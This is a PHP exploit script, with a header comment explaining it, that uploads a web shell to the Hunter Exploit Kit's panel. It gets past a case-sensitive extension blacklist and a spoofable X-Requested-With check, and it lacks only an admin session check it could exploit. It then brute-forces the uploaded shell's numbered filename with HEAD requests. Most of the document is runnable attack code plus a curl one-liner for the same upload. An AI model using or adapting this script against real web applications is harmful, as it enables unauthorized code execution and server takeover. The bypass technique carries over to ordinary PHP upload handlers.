<?php

/*
	---------------------------------------------------------------------------
	Hunter Exploit Kit Arbitrary File Upload Exploit
	---------------------------------------------------------------------------	
	
	author: hexlax
	  file: Ekit-newtask.php
	  vuln: This PHP file is using a Blacklist of forbidden extensions
			and check is not case insensitive. Also, does not check for proper 
			authenticated admin session.

	Exentensions Blacklist:
	 # HTML may contain cookie-stealing JavaScript and web bugs
	 '.html', '.htm', '.js', '.jsb', '.mhtml', '.mht', '.xhtml', '.xht',
 	# PHP scripts may execute arbitrary code on the server
	 '.php', '.phtml', '.php3', '.php4', '.php5', '.phps',
 	# Other types that may be interpreted by some servers
	 '.shtml', '.jhtml', '.pl', '.py', '.cgi',
	 '.jpg', '.jpeg', '.gif', '.py', '.cgi',
	# May contain harmful executables for Windows victims
	 '.txt', '.scr', '.dll', '.msi', '.vbs', '.bat', '.com', '.pif', '.cmd', '.vxd', '.cpl' 

	The uploads directory is hardcoded with the md5sum 
	of "uploads" = "5128f35c9b4be13788ba41bdb6d1fc1f/".
	There is also the AJAX check which can be easily bypassed by sending fake 
	X-REQUESTED-With headers.

	Curl cli exploit:
	$ curl -H "X-Requested-With : XMLHttpRequest" 
		-F 'upl=@shell.php;filename=shell.PHP' 
		http://hunterek.local/ek/Ekit-newtask.php

	Explained:
	-H parameter bypasses AJAX Request check
	-F upl=@shell.php is the PHP shell on disk we are uploading named "shell.php"
	;filename=shell.PHP 	is our changing of the filename to bypass extension blacklisting

	The shell is then located at:
	http://hunterek.local/ek/5128f35c9b4be13788ba41bdb6d1fc1f/<RANDOM_DIGIT>.php
	Where RANDOM_DIGIT can be anything between 1 and 9,999,999,999, although on my 
	test system randmax() is 2,147,483,647.
*/

//error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

$UserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';

echo "\n+------------------------------------------------------------+";
echo "\n| Hunter Exploit Kit Arbitrary File Upload Exploit by hexlax |";
echo "\n+------------------------------------------------------------+\n\n";


if ($argc < 2)
{
	echo "Usage....: php $argv[0] url PHP_shell\n";
	echo "Example..: php $argv[0] http://panel/path/ shell.php\n\n";
	die();
}

$URL = $argv[1].'Ekit-newtask.php';
$Shell = $argv[2];

echo "[-] Checking URL...\n";
$urlcheck = curl_init($URL);
curl_setopt($urlcheck, CURLOPT_NOBODY, true);
curl_setopt($urlcheck, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($urlcheck);
if ($result !== false) 
{
	$statusCode = curl_getinfo($urlcheck, CURLINFO_HTTP_CODE);  
	if ($statusCode == 404) 
	{
    	echo "[!] Bad URL???\n";
    	echo "[!] Specify URL path to Ekit-newtask.php\n\n";
    	die();
	}
	else
	{
		echo "[-] URL check passed!\n";
	}
}
else
{
	echo "[!] Bad URL???\n";
    echo "[!] Please specify URL path to Ekit-newtask.php\n\n";
    die();
}
curl_close($urlcheck);

echo "[-] Building Exploit...\n";
$curlexploit = curl_init($URL);
curl_setopt($curlexploit, CURLOPT_USERAGENT, $UserAgent);
curl_setopt($curlexploit, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curlexploit, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest")); 
curl_setopt($curlexploit, CURLOPT_POST, true);
curl_setopt($curlexploit, CURLOPT_POSTFIELDS,
    array(
      'upl' => '@' . realpath($Shell).';filename=a.PHP'
    ));
echo "[-] Launching Exploit Torpedos!!!\n";
$r = curl_exec($curlexploit);
curl_close($curlexploit);

// Now attempt to find our placed shell via HTTP HEAD requests
// Could definately use some multithreading love here :)
echo "[-] Trying to find shell...\n";
for($i=0; $i<=9999999999; $i++)
{
	$temp_url = $argv[1].'5128f35c9b4be13788ba41bdb6d1fc1f/'.$i.'.php';
	$findshell = curl_init($temp_url);
	curl_setopt($findshell, CURLOPT_NOBODY, true);
	curl_setopt($findshell, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($findshell);
	if ($result !== false) 
	{
		$statusCode = curl_getinfo($findshell, CURLINFO_HTTP_CODE);  
		if ($statusCode == 200) 
		{
			echo "[-] Possible Shell: ".$temp_url."\n\n";
			die();			

		}
		/*else
		{
	    	echo "[!] Not at ".$temp_url."\n";
		}
		*/
	}
	curl_close($findshell);
}
echo "[!] Sorry, finding shell or exploit on fail bus...\n\n";
